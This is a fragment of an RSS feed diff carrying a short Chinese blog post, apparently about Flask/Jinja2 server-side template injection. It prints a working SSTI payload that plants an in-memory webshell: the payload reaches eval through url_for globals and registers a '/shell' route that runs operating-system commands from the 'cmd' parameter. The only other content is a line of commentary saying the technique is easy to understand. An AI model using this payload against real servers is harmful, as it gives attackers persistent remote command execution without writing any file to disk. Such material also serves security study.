+&lt;p&gt;内存马无需上传文件也不生成文件。内存马通过动态注册一个路由来作为执行命令参数的入口。 &lt;code&gt;&amp;#123;&amp;#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&#34;,&amp;#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&amp;#125;)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://mmbiz.qpic.cn/mmbiz_png/crOK73kjDuiaCYofiaN8P1yvfgjTKEPdNbUUmZdib44GLJRFQC74xxXcC4vgnsMWwpEibich74wfnVr2uwGaXrTqRibQ/640?wx_fmt=png&amp;amp;from=appmsg&amp;amp;tp=webp&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
+&lt;p&gt;内存马看了一下，出了最后两句，其他的还是很好理解的，就是新增了一个&lt;/p&gt;
+&lt;p&gt;路由，进行了命令执行，很神奇&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
